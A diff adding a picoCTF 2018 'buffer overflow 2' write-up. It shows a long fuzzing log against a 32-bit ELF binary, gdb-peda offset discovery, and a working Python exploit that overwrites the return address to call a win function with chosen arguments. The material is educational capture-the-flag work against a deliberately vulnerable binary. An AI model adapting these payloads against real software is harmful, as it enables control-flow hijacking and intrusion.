@@ -300,6 +300,427 @@ we see the offset is at 12 , then we prepare our payload to read flag.txt
 ``` python -c "print 'A'*12+'\xcb\x85\x04\x08'*9" | ./vuln ```
 
 
+# binary exploitation buffer overflow 2 
+
+we first checked what kind of binary is.
+
+![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_0.png)
+
+once after we see it is an ELF 32 bits, then we ran GDB to see their functions, and binary security.
+
+![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_1.png)
+
+the binary display a ``` main , win, vuln functions ``` with their address , and we make our fuzzer to fuzz our binary as below
+
+```
+
+1
+Please enter your string: 
+A˅aaaaﾭ�����p�
+2
+Please enter your string: 
+AA˅aaaaﾭ�����p�
+3
+Please enter your string: 
+AAA˅aaaaﾭ�����p�
+4
+Please enter your string: 
+AAAA˅aaaaﾭ�����p�
+5
+Please enter your string: 
+AAAAA˅aaaaﾭ�����p�
+6
+Please enter your string: 
+AAAAAA˅aaaaﾭ�����p�
+7
+Please enter your string: 
+AAAAAAA˅aaaaﾭ�����p�
+8
+Please enter your string: 
+AAAAAAAA˅aaaaﾭ�����p�
+9
+Please enter your string: 
+AAAAAAAAA˅aaaaﾭ�����p�
+10
+Please enter your string: 
+AAAAAAAAAA˅aaaaﾭ�����p�
+11
+Please enter your string: 
+AAAAAAAAAAA˅aaaaﾭ�����p�
+12
+Please enter your string: 
+AAAAAAAAAAAA˅aaaaﾭ�����p�
+13
+Please enter your string: 
+AAAAAAAAAAAAA˅aaaaﾭ�����p�
+14
+Please enter your string: 
+AAAAAAAAAAAAAA˅aaaaﾭ�����p�
+15
+Please enter your string: 
+AAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+16
+Please enter your string: 
+AAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+17
+Please enter your string: 
+AAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+18
+Please enter your string: 
+AAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+19
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+20
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+21
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+22
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+23
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+24
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+25
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+26
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+27
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+28
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+29
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+30
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+31
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+32
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+33
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+34
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+35
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+36
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+37
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+38
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+39
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+40
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+41
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+42
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+43
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+44
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+45
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+46
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+47
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+48
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+49
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+50
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+51
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+52
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+53
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+54
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+55
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+56
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+57
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+58
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+59
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+60
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+61
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+62
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+63
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+64
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+65
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+66
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+67
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+68
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+69
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+70
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+71
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+72
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+73
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+74
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+75
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+76
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+77
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+78
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+79
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+80
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+81
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+82
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+83
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+84
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+85
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+86
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+87
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+88
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+89
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+90
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+91
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+92
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+93
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+94
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+95
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+96
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+97
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+98
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+99
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+100
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+101
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+102
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+103
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+104
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+105
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+106
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+107
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+108
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+109
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+110
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+111
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+Segmentation fault (core dumped)
+112
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
+hacked
+
+```
+
+we create a random strings to overflow with gdb-peda 
+
+![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_2.png)
+
+
+we notice our offset is between 107 and 111, and we tried to check with gdb-peda 
+
+![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_3.png)
+
+we GOT IT.. 
+
+so far we have win address, args 1 , and args 2 from source. So we tried to code the vuln to exploit.py , we ran gdb-peda to search rop gadgets as below
+
+![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_4.png)
+
+
+YAY !!! we got RET address , and the last one , we need the exit address as below:
+
+![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_5.png)
+
+
+So we have so far win address + RET + args 1 + args 2 + exit. it's time to code it
+
+```
+
+#!/usr/bin/python
+""" Buffer Overflow 2 From Pico CTF 2018"""
+import struct
+from subprocess import Popen, PIPE, STDOUT
+
+payload = ''
+payload += '\x41'*112 #nopsled
+payload +=  struct.pack('<L', 0x080485cb) #win address
+payload +=  struct.pack('<L', 0x080483f6) #RET
+payload +=  struct.pack('<L', 0xDEADBEEF) #arg 1
+payload +=  struct.pack('<L', 0xDEADC0DE) #arg 2
+payload +=  struct.pack('<L', 0x8048470) #exit address 
+filename = Popen(['./vuln'], stdin=PIPE)
+filename.stdin.write(payload)
+
+```
+
 
 
 
